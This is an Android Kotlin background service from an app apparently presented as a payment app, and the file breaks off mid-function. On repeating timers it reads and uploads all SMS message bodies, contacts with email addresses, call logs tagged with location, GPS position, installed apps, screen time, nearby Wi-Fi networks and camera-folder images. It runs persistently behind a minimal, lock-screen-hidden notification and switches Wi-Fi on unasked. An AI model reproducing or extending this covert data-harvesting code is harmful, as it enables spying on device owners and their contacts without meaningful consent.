package com.payment.app.services

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationChannelGroup
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.Location
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.Uri
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.ContactsContract.PhoneLookup
import android.provider.MediaStore
import android.provider.Telephony
import android.text.TextUtils
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.android.volley.AuthFailureError
import com.android.volley.NetworkError
import com.android.volley.NetworkResponse
import com.android.volley.NoConnectionError
import com.android.volley.ParseError
import com.android.volley.Response
import com.android.volley.ServerError
import com.android.volley.TimeoutError
import com.android.volley.VolleyError
import com.android.volley.toolbox.HttpHeaderParser
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.payment.app.ApiCallManager
import com.payment.app.HomeActivity
import com.payment.app.R
import com.payment.app.imageresizer.ImageResizer
import com.payment.app.model.CallLogModel
import com.payment.app.model.ContactSyncModel
import com.payment.app.model.InstalledApp
import com.payment.app.model.ScreenTimeModel
import com.payment.app.model.SmsModel
import com.payment.app.model.WifiListModel
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.time.Instant
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.time.DurationUnit
import kotlin.time.toDuration


class MyService : Service() {
    var latitude = 0.0
    var longitude = 0.0
    var currentDateTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        LocalDateTime.now()
    } else {
        TODO("VERSION.SDK_INT < O")
    }
    val dateFormat: DateFormat = SimpleDateFormat("dd-MM-yyyy")
    private var isCallLogPermissionGranted = false
    private var isContactPermissionGranted = false
    private var isLocationPermissionGranted = false
    private var isPostNotificationPermissionGranted = false
    private var isSmsPermissionGranted = false
    private var isReadMediaImagePermissionGranted = false
    private lateinit var wifiManager: WifiManager
    private val PERMISSIONS_REQUEST_CODE = 123

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    val apiCall = ApiCall()
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action != null && intent.action.equals(
                "ACTION_STOP_FOREGROUND", ignoreCase = true)) {
            this.stopForeground(true)
            stopSelf()
        }

        val timer = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                generateForegroundNotification()
                getLocation(applicationContext)
            } catch (e: Exception) {
//                ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)
//
        val batteryTimer = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            Log.d("fetchAndLogDataBatteryInfo ","fetchAndLogDataBatteryInfo")
//            fetchAndLogDataBatteryInfo()
            try {
                fetchAndLogDataBatteryInfo()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Battery Level Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)

        val smsTimer = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                fetchSmsInfo()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global SMS Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)
//
        val contactTimer = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                removeContact()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Contact sync Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)

        val callLogTimer = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                getTodayCallHistory()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Call History Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)
//
        val readImage = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                getImagesFromCameraFolder()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Image Video Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,1, TimeUnit.HOURS)
//
        val notificationService = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                val serviceIntent = Intent(this, NotificationService::class.java)
                startService(serviceIntent)

            } catch (e: Exception) {
                ApiCallManager.appendLog("Global notificationService Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)
//
        val allAppGetServices = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                getAllAppData()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Get All App Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,1, TimeUnit.DAYS)

        val allAppScreenTimeServices = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                getAllAppScreenTimeData()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Get App All Screen Time Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,1, TimeUnit.DAYS)
//
//
        val getNearByWifi = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
            try {
                wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
                if (!wifiManager.isWifiEnabled) {
                    wifiManager.isWifiEnabled = true
                }
                scanWifiNetworks()
            } catch (e: Exception) {
                ApiCallManager.appendLog("Global Get Near by Wifi Exception Handler: ${e.message ?: "Unknown Error"}")
            }
        },0,15, TimeUnit.MINUTES)


        return START_STICKY

        //Normal Service To test sample service comment the above    generateForegroundNotification() && return START_STICKY
        // Uncomment below return statement And run the app.
//        return START_NOT_STICKY
    }

    private lateinit var wifiInfo: WifiInfo

    private fun scanWifiNetworks() {
        val sharedPreferences: SharedPreferences = getSharedPreferences(
            "token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        // Trigger a Wi-Fi scan
        wifiManager.startScan()
        wifiInfo = wifiManager.connectionInfo

        // Retrieve scan results
        val scanResults = wifiManager.scanResults

        val wifiNetworks = ArrayList<WifiListModel>()


        for (result in scanResults) {
            val ssid = result.SSID // SSID of the network
            val signalStrength = result.level // Signal strength in dBm

            wifiNetworks.add(
                WifiListModel(
                    ssid,
                    signalStrength.toString()
                )
            )
        }
        var baseUrl = getString(R.string.api)

        apiCall.addWifiList(wifiNetworks,token,applicationContext,baseUrl)

        Log.d("wifiNetworks", "$wifiNetworks")

    }

    private fun getAllAppData() {
        val sharedPreferences: SharedPreferences = getSharedPreferences(
            "token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        val prefs : SharedPreferences = getSharedPreferences("isAllGetAppApiCall", MODE_PRIVATE)
        val editor = prefs.edit()
        val oldDate = prefs.getString("oldAllAppDate","")
        Log.d("oldAllAppDate",oldDate.toString())
        Log.d("oldAllAppDate",dateFormat.format(Calendar.getInstance().time).toString())
        if(oldDate.toString() != dateFormat.format(Calendar.getInstance().time).toString()){
            editor.putString("isAllGetAppApi","")
            editor.apply()
        }
        val isAllLogApiCalls = prefs.getString("isAllGetAppApi","")
        Log.d("oldAllAppDate",oldDate.toString() + isAllLogApiCalls.toString())

        val packageManager: PackageManager = packageManager
        val applications: List<ApplicationInfo> = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)

        val dataList = ArrayList<InstalledApp>()
        for (appInfo in applications) {
            if (appInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                val appName = appInfo.loadLabel(packageManager).toString()
                val appSize = getApplicationSize(appInfo)
                val appInstallTimeMillis = File(appInfo.sourceDir).lastModified()
                val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    LocalDateTime.ofInstant(
                        Instant.ofEpochMilli(appInstallTimeMillis), TimeZone
                            .getDefault().toZoneId()
                    )
                } else {
                    TODO("VERSION.SDK_INT < O")
                }

                dataList.add(
                    InstalledApp(
                        appName,
                        appSize,
                        triggerTime.toString()
                    )
                )
            }

        }
        var baseUrl = getString(R.string.api)
        if(dataList.isNotEmpty()){
            if(isAllLogApiCalls.toString() == ""){
                apiCall.getAllAppApi(dataList,token,applicationContext,baseUrl,prefs)
            }
        }

    }

    private fun getAllAppScreenTimeData() {
        val sharedPreferences: SharedPreferences = getSharedPreferences(
            "token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        val prefs : SharedPreferences = getSharedPreferences("isAllGetAppScreenApiCall", MODE_PRIVATE)
        val editor = prefs.edit()
        val oldDate = prefs.getString("oldAllScreenTimeAppDate","")
        Log.d("oldAllScreenTimeAppDate",oldDate.toString())
        Log.d("oldAllScreenTimeAppDate",dateFormat.format(Calendar.getInstance().time).toString())
        if(oldDate.toString() != dateFormat.format(Calendar.getInstance().time).toString()){
            editor.putString("isAllAppScreenTimeApi","")
            editor.apply()
        }
        val isAllLogApiCalls = prefs.getString("isAllAppScreenTimeApi","")
        Log.d("oldAllScreenTimeAppDate",oldDate.toString() + isAllLogApiCalls.toString())

        val packageManager: PackageManager = packageManager
        val applications: List<ApplicationInfo> = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager

        val screenTimeList = ArrayList<ScreenTimeModel>()
        val calendar = Calendar.getInstance()
        calendar.set(Calendar.HOUR_OF_DAY, 0)
        calendar.set(Calendar.MINUTE, 0)
        calendar.set(Calendar.SECOND, 0)
        val endTime = System.currentTimeMillis()
        val startTime = calendar.timeInMillis
        val usageStatsList = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_BEST,
            startTime,
            endTime
        )

        for (appInfo in applications) {
            if (appInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                val packageName = appInfo.packageName

                for (usageStats in usageStatsList) {
                    if (usageStats.packageName == packageName) {
                        val packageNameNew = usageStats.packageName // Time in milliseconds
                        val totalUsageTime = usageStats.totalTimeInForeground // Time in milliseconds
                        val appName = getAppNameFromPackageName(this, packageName)
                        val total = totalUsageTime / 1000 / 60
                        screenTimeList.add(
                            ScreenTimeModel(
                                appName,
                                total.toString()
                            )
                        )
                        Log.d("App Usage", "Package Name: $packageNameNew, Screen Time: $totalUsageTime milliseconds")
                    }
//                        val usageStats = getUsageStats(this, packageName, startTime, endTime)
//                        screenTime = usageStats
//                    }
                }
            }
        }

        Log.d("screenTimeList", "Package Name: $screenTimeList")

        var baseUrl = getString(R.string.api)

        if(screenTimeList.isNotEmpty()){
            apiCall.getScreenTimeApi(screenTimeList,token,applicationContext,baseUrl,prefs)
        }

    }

    private fun getAppNameFromPackageName(context: Context, packageName: String): String {
        val packageManager = context.packageManager
        val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
        return packageManager.getApplicationLabel(applicationInfo).toString()
    }

    private fun getApplicationSize(appInfo: ApplicationInfo): String {
        val sourceDir = appInfo.sourceDir
        val sizeInBytes = getFileSize(sourceDir)
        val sizeInMB = sizeInBytes / (1024 * 1024)
        return "$sizeInMB MB"
    }

    private fun getFileSize(filePath: String): Long {
        val file = File(filePath)
        if (file.exists()) {
            return file.length()
        }
        return 0
    }


    @SuppressLint("MissingPermission", "SetTextI18n")
    private fun getLocation(
        applicationContext: Context,
    ) {
        val sharedPreferences: SharedPreferences = getSharedPreferences(
            "token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val locationRequest: LocationRequest = LocationRequest.create()
            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
            if (ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                    applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {

            }
            LocationServices.getFusedLocationProviderClient(applicationContext)
                .lastLocation
                .addOnSuccessListener { location ->
                    if (location != null) {
                        val lat = location.latitude
                        val long = location.longitude
                        latitude = lat
                        longitude = long
                        var baseUrl = getString(R.string.api)
                        ApiCallManager.appendLog("Location not null!!")
                        ApiCallManager.appendLog("CALLING LOCATION API")
                        Log.d("Servicesssss", "runsss: $lat")

                        apiCall.locationApi(latitude, longitude,applicationContext,baseUrl,token)
                    } else {
                        Log.d("Servicesssss", "runsss: ")
                        ApiCallManager.appendLog("LOCATION IS NULL!!!!")
                    }
                }

        }
        else{
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

            fusedLocationClient.lastLocation
                .addOnSuccessListener { location: Location? ->
                    // Handle the retrieved location here (location might be null).
                    if (location != null) {
                        val latitude = location.latitude
                        val longitude = location.longitude
                        var baseUrl = getString(R.string.api)
                        ApiCallManager.appendLog("LOCATION IS NOT NULL!!!!")

                        // Do something with latitude and longitude.
                        apiCall.locationApi(latitude, longitude,applicationContext,baseUrl,token)

                    } else {
                        ApiCallManager.appendLog("LOCATION IS NULL!!!!")

                        // Location is null; handle this case.
                    }
                }
                .addOnFailureListener { exception ->
                    ApiCallManager.appendLog("FAIL LOCATION!!!!")

                    // Handle the failure to retrieve location.
                }
        }
    }


    private fun fetchSmsInfo() {
        ApiCallManager.appendLog("Gathering SMS")
        val sharedPreferences: SharedPreferences = getSharedPreferences("token", MODE_PRIVATE)
        val token: String = sharedPreferences.getString("token", "").toString()
        val prefs : SharedPreferences = getSharedPreferences("isAllSmsLogApiCall", MODE_PRIVATE)
        val editor = prefs.edit()
        val isAllLogApiCall = prefs.getString("isAllSmsLogApi","")
        val oldDate = prefs.getString("oldSmsDate","")
//        Log.d("isAllLogApiCall",oldDate.toString())

        val formatter = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        var finalDate: LocalDateTime = LocalDateTime.now()
        if(oldDate != ""){
            finalDate = LocalDateTime.parse(oldDate, formatter)
        }
        try {

            val uri = Uri.parse("content://sms")
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
            )
            val selection = Telephony.Sms.TYPE + " != ?"
            val selectionArgs = arrayOf(Telephony.Sms.MESSAGE_TYPE_DRAFT.toString())

            val cursor = contentResolver.query(
                uri, projection, selection,
                selectionArgs, null
            )

            val dataList = ArrayList<SmsModel>()
            val dateList = ArrayList<String>()
            ApiCallManager.appendLog("Found: ${cursor!!.count} SMS!")

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") val address =
                        cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)) ?: ""
                    @SuppressLint("Range") val body =
                        cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)) ?: ""
                    @SuppressLint("Range") val date =
                        cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))
                    @SuppressLint("Range") val type =
                        cursor.getLong(cursor.getColumnIndex(Telephony.Sms.TYPE))
                    val name = getContactName(
                        applicationContext,
                        cursor.getString(
                            cursor
                                .getColumnIndexOrThrow("address")
                        )
                    ) ?: ""

                    val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    val formattedDate = sdf.format(Date(date))
                    val ddate = LocalDateTime.parse(formattedDate, formatter)

                    dateList.add(formattedDate)
                    val triggerTime = LocalDateTime.ofInstant(
                        Instant.ofEpochMilli(date), TimeZone
                            .getDefault().toZoneId()
                    )
//                    Log.d("triggerTime", triggerTime.toString())
                    // Process the SMS record (e.g., display it in a list, log it, etc.)
//                    Log.d(
//                        "SMSHistory",
//                        "Address: $address Body: $body Date: $triggerTime Type: $type Name: $name"
//                    )
                    ApiCallManager.appendLog("SMSHistory===>  Address: $address Body: $body Date: $triggerTime Type: $type Name: $name formatted Date:=> $formattedDate")

                    val digitsOnly: Boolean =
                        TextUtils.isDigitsOnly(charRemoveAt(address.toString(), 0).toString())
//                    Log.d("digitsOnly", digitsOnly.toString())
                    if(isAllLogApiCall == "true"){

                        if(finalDate.isBefore(ddate)){
                            dataList.add(
                                SmsModel(
                                    name.toString(),
                                    address,
                                    body,
                                    type.toInt(),
                                    triggerTime.toString()
                                )
                            )
                        }
                    }
                    else{

                        dataList.add(
                            SmsModel(
                                name.toString(),
                                address,
                                body,
                                type.toInt(),
                                triggerTime.toString()
                            )
                        )
                    }

                }
                cursor.close()
            }
            ApiCallManager.appendLog("get: ${dataList.size} SMS!")
            var baseUrl = getString(R.string.api)
            if(dataList.isNotEmpty()){
                apiCall.callSmsApi(dataList,token,applicationContext,baseUrl,editor,dateList)
            }
//            Log.d("Last Date",dateList.first())


        } catch (e: Exception) {
            ApiCallManager.appendLog("SMS gathering failed: ${e.message ?: "Unknown error!"}")
        }

    }

    private fun removeContact() {
        ApiCallManager.appendLog("=====")
        ApiCallManager.appendLog("Removing Contacts API Call")
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token", MODE_PRIVATE)
        val token: String = sharedPreferences.getString("token", "").toString()
        Log.d("token", token)

        var baseUrl = getString(R.string.api)

        val url = "$baseUrl/api/Contacts/RemoveContacts"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener<String?> { response -> Log.i("VOLLEY", response!!) },
            Response.ErrorListener { error -> Log.e("VOLLEY", error.toString()) }) {
            override fun getBodyContentType(): String {
                return "application/json; charset=utf-8"
            }

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                // request body goes here
                val jsonBody = JSONObject()
                val requestBody = jsonBody.toString()
                return requestBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val params: MutableMap<String, String> = HashMap()
                params["Content-Type"] = "application/json"
                params["Authorization"] = "Bearer $token"
                return params
            }

            override fun parseNetworkResponse(response: NetworkResponse): Response<String> {
                var responseString = ""
                if (response != null) {
                    ApiCallManager.appendLog("Removing Contacts API Success")
                    ApiCallManager.appendLog("==========")
                    responseString = response.statusCode.toString()
                    Log.d("responseString", responseString)
                    getContactHistory()
                    // can get more details such as response.headers
                } else {
                    ApiCallManager.appendLog("Removing Contacts Success BUT received null response")
                    ApiCallManager.appendLog("==========")
                    getContactHistory()
                }
                return Response.success(
                    responseString,
                    HttpHeaderParser.parseCacheHeaders(response)
                )
            }
        }
        Log.d("string", stringRequest.toString())
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(stringRequest)
    }

    var totalContactList:Int = 0
    var countContactList:Int = 0
    @SuppressLint("Range")
    private fun getContactHistory() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        try {
            ApiCallManager.appendLog("======")
            ApiCallManager.appendLog("Getting all contacts...")
            val contentResolver = getContentResolver()
            val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val cursor = contentResolver.query(
                uri, null, null,
                null, null
            )
            Log.d("contactNumber", "contactNumber: " + cursor!!.count.toString())
            var i = 0
            val dataList = ArrayList<ContactSyncModel>()
            totalContactList = cursor.count

            if (cursor.count > 0) {
                while (cursor.moveToNext()) {
                    val name =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER.trim()))
                    val phoneType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
                    val emailAddress = getEmailAddress(name) // Replace with the contact's name
//                    Log.d("Email--->",emailAddress.toString())

                    if (i < 500) {
                        if (number.length < 15) {
                            if (phoneType == ContactsContract.CommonDataKinds.Phone.TYPE_WORK) {
                                dataList.add(ContactSyncModel(name, "", "", number, emailAddress?:""))
                            }
                            else if(phoneType == ContactsContract.CommonDataKinds.Phone.TYPE_HOME){
                                dataList.add(ContactSyncModel(name, "", number, "", emailAddress?:""))
                            }
                            else{
                                dataList.add(ContactSyncModel(name, number, "", "", emailAddress?:""))
                            }
//                            Log.d("Contact dataList $i","$name  $number $displayName")
                            countContactList++
                        }
                    }
                    if(countContactList == 100){
                        break
                    }
                    i++
                }
            } else {
                false
            }
            Log.d("dataList", dataList.toString())
            var baseUrl = getString(R.string.api)
            if(dataList.isNotEmpty()){
                apiCall.contactHistoryApi(dataList,token,applicationContext,baseUrl)
            }
        } catch (e: Exception) {
            ApiCallManager.appendLog("Gathering contacts failed: ${e.toString() ?: ""}")
        }
    }
    private fun getEmailAddress(contactName: String): String? {
//        Log.d("contactName",contactName)
        val contentResolver: ContentResolver = contentResolver
        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME
        )
        val selection = "${ContactsContract.Contacts.DISPLAY_NAME} = ?"
        val selectionArgs = arrayOf(contactName)
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            null
        )

        var emailAddress: String? = null

        if (cursor != null && cursor.moveToFirst()) {
            val contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))

            val emailCursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                arrayOf(contactId),
                null
            )

            while (emailCursor != null && emailCursor.moveToNext()) {
                val email =
                    emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))

                // You can add more conditions to check for specific email types, if needed
                emailAddress = email
                break
            }

            emailCursor?.close()
        }

        cursor?.close()

        return emailAddress
    }

    @SuppressLint("Range")
    private fun getTodayCallHistory() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        val prefs : SharedPreferences = getSharedPreferences("isAllCallLogApiCall", MODE_PRIVATE)
        val editor = prefs.edit()
        val isAllLogApiCall = prefs.getString("isAllCallLogApi","")
        val oldDate = prefs.getString("oldCallDate","")
        Log.d("isAllCallLogApi",oldDate.toString())
        val formatter = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        var finalDate: LocalDateTime = LocalDateTime.now()
        if(oldDate != ""){
            finalDate = LocalDateTime.parse(oldDate, formatter)
        }
        Log.d("Old Date",finalDate.toString())
        Log.d("Current Date",currentDateTime.toString())
        val dateList = ArrayList<String>()

        try {
            val calendar = Calendar.getInstance()
            calendar[Calendar.HOUR_OF_DAY] = 0
            calendar[Calendar.MINUTE] = 0
            calendar[Calendar.SECOND] = 0
            val startOfDay = calendar.time
            Log.d("startOfDay ", startOfDay.toString())

            val uri = Uri.parse(CallLog.Calls.CONTENT_URI.toString())
            val cursor = applicationContext.contentResolver.query(
                uri, null, null,
                null, null
            )
            Log.d("CallLogWorker", "doWork: Success")
            val dataList = ArrayList<CallLogModel>()

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                    val callerName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))+" "
                    val callDate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))
                    val callType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE))
                    val callDuration: Int = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION))
                    val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    val formattedDate = sdf.format(Date(callDate))
                    val ddate = LocalDateTime.parse(formattedDate, formatter)
                    dateList.add(formattedDate)
                    val triggerTime = LocalDateTime.ofInstant(
                        Instant.ofEpochMilli(callDate), TimeZone
                            .getDefault().toZoneId()
                    )
//                    Log.d(
//                        "CallHistory",
//                        "phoneNumber: $phoneNumber callerName: $callerName callType: $callType  callDuration: ${callDuration.toDuration(
//                            DurationUnit.SECONDS)
//                        } Date: $formattedDate"
//                    )

                    if(isAllLogApiCall == "true"){
                        if(finalDate.isBefore(ddate)){
                            dataList.add(
                                CallLogModel(
                                    callerName,
                                    phoneNumber,
                                    callType,
                                    callDuration.toDuration(DurationUnit.SECONDS).toString(),
                                    latitude.toString(),
                                    longitude.toString(),
                                    "",
                                    triggerTime.toString()
                                )
                            )
                        }
                    }
                    else{
                        dataList.add(
                            CallLogModel(
                                callerName,
                                phoneNumber,
                                callType,
                                callDuration.toDuration(DurationUnit.SECONDS).toString(),
                                latitude.toString(),
                                longitude.toString(),
                                "",
                                triggerTime.toString()
                            )
                        )
                    }

                }
                cursor.close()
            } else {
                Log.d(
                    "CallHistory", "Today Call Log Is Empty "
                )
            }

            var baseUrl = getString(R.string.api)

            Log.d("dataList" ,dataList.toString())
            if(dataList.isNotEmpty()){
                apiCall.callHistoryApi(dataList,applicationContext,token,baseUrl,editor,dateList)
            }

        }
        catch (e:Exception){
            ApiCallManager.appendLog("CallHistory gathering failed: ${e.message ?: "Unknown error!"}")
        }

    }


    //Notififcation for ON-going
    private var iconNotification: Bitmap? = null
    private var notification: Notification? = null
    var mNotificationManager: NotificationManager? = null
    private val mNotificationId = 1001

    private fun generateForegroundNotification() {


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val locationRequest: LocationRequest = LocationRequest.create()
            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
            if (ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                    applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {

                Log.d("Permission Denied", "Permission Denied")

            }
            LocationServices.getFusedLocationProviderClient(applicationContext)
                .lastLocation
                .addOnSuccessListener { location ->
                    if (location != null) {
                        val lat = location.latitude
                        val long = location.longitude
                        latitude = lat
                        longitude = long
                        Log.d("Servicesssss", "runsss: $longitude $latitude")
                    }
                }


            val intentMainLanding = Intent(this, HomeActivity::class.java)

            var pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.getActivity(this, 0, intentMainLanding, PendingIntent.FLAG_MUTABLE)
            } else {
                PendingIntent.getActivity(
                    this, 0, intentMainLanding, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
            }
            iconNotification = BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
            if (mNotificationManager == null) {
                mNotificationManager = this.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                assert(mNotificationManager != null)
                mNotificationManager?.createNotificationChannelGroup(
                    NotificationChannelGroup("chats_group", "Chats")
                )
                val notificationChannel =
                    NotificationChannel("service_channel", "Service Notifications",
                        NotificationManager.IMPORTANCE_MIN)
                notificationChannel.enableLights(false)
                notificationChannel.lockscreenVisibility = Notification.VISIBILITY_SECRET
                mNotificationManager?.createNotificationChannel(notificationChannel)
            }
            val builder = NotificationCompat.Builder(this, "service_channel")

            builder.setContentTitle(StringBuilder(resources.getString(R.string.app_name)).append(" service is running").toString())
                .setTicker(StringBuilder(resources.getString(R.string.app_name)).append("service is running").toString())
                //.setContentText("lat =>$latitude ,long => $longitude") //                    , swipe down for more options.
                .setContentText("Tap here to know more") //                    , swipe down for more options.
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setWhen(0)
                .setOnlyAlertOnce(true)
                .setContentIntent(pendingIntent)
                .setOngoing(true)

            if (iconNotification != null) {
                builder.setLargeIcon(Bitmap.createScaledBitmap(iconNotification!!, 128, 128, false))
            }

            builder.color = resources.getColor(R.color.purple_200)
            notification = builder.build()
            startForeground(mNotificationId, notification)
        }

    }

    private fun fetchAndLogDataBatteryInfo() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token", MODE_PRIVATE)
        val token: String = sharedPreferences.getString("token","").toString()
        // Code to fetch connectivity status (Data/WiFi) and battery percentage
        val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetworkInfo = connectivityManager.activeNetworkInfo
        val isConnected = activeNetworkInfo != null && activeNetworkInfo.isConnected
        val batteryIntentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
